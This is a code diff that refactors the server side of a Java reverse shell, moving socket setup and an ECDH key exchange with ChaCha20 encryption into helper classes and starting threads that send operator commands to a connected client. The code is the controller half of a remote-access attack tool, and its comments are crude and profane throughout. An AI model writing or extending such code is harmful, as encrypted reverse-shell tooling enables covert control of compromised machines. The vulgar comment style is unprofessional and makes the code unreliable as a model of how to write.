@@ -3,7 +3,7 @@ package obs1d1anc1ph3r.reverseshell.server;
 import java.io.*;
 import java.net.*;
 import java.util.logging.*;
-import obs1d1anc1ph3r.reverseshell.server.encryption.ECDHKeyExchange;
+import obs1d1anc1ph3r.reverseshell.server.encryption.SecureConnection;
 
 public class ReverseShellServer {
 
@@ -26,12 +26,18 @@ public class ReverseShellServer {
 
 	public void start() {
 		try {
-			setupServer(); //Server port and stuff
-			waitForConnection(); //Wait for client
-			setupStreams(); //In and out streams
-			setupSecureConnection(); //Do the cool handshake so you know they're a homie
+			ServerSetup serverSetup = new ServerSetup(SERVER_PORT);
+			serverSetup.setupServer(); //Server port and stuff
+			this.serverSocket = serverSetup.getServerSocket(); //Server socket
+			this.clientSocket = serverSetup.waitForConnection(); //Client socket
+			this.dataIn = serverSetup.getDataInputStream(); //Data in stream
+			this.dataOut = serverSetup.getDataOutputStream(); //Data out stream
+			this.userInput = serverSetup.getUserInput(); //User input stream thing
 
-			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey, nonce)); //Handle those responses
+			SecureConnection secureConnection = new SecureConnection(dataIn, dataOut);
+			this.encryptionKey = secureConnection.establishSecureConnection(); //Do the cool handshake so you know they're a homie
+
+			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey)); //Handle those responses
 			outputReceiver.start();
 
 			inputHandler = new Thread(new CommandSender(dataOut, userInput, this, encryptionKey, nonce)); //Send those commands like a dom
@@ -40,48 +46,6 @@ public class ReverseShellServer {
 		} catch (IOException e) {
 			logger.log(Level.SEVERE, "[ERROR] Server error: " + e.getMessage(), e);
 		}
-	}
-
-	private void setupServer() throws IOException {
-		serverSocket = new ServerSocket(SERVER_PORT);
-		logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT); //Port stuff, fuck yeah
-	}
-
-	private void waitForConnection() throws IOException {
-		logger.info("[-] Waiting for incoming connection..."); //I'm waiting
-		clientSocket = serverSocket.accept();
-		logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress()); //Gimme that ip
-	}
-
-	private void setupStreams() throws IOException {
-		dataIn = new DataInputStream(clientSocket.getInputStream());
-		dataOut = new DataOutputStream(clientSocket.getOutputStream());
-		userInput = new BufferedReader(new InputStreamReader(System.in));
-	}
-
-	private void setupSecureConnection() throws IOException {
-		try {
-			byte[] serverPrivateKey = ECDHKeyExchange.generatePrivateKey(); //Key stuff
-			byte[] serverPublicKey = ECDHKeyExchange.generatePublicKey(serverPrivateKey); //More key stuff
-
-			dataOut.writeInt(serverPublicKey.length); //Give the client some of the key stuff
-			dataOut.write(serverPublicKey); //More giving the client key stuff
-			dataOut.flush(); //More flushing
-
-			int clientKeyLength = dataIn.readInt(); //Get the client's key stuff
-			byte[] clientPublicKey = new byte[clientKeyLength]; //More getting the client's key stuff
-			dataIn.readFully(clientPublicKey); //Maybe this is why I'm a virgin?
-
-			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(serverPrivateKey, clientPublicKey); //Do the handshake like a fucking boss
-
-			logger.info("[-] Secure connection established using ECDH and ChaCha20 encryption."); //Yeah, this is why I'm a virgin
-		} catch (IOException e) {
-			throw new IOException("Secure key exchange failed: " + e.getMessage(), e);
-		}
-	}
-
-	public Socket getClientSocket() { //clientussy
-		return clientSocket;
 	}
 
 	public void cleanup() { //Hell yeah
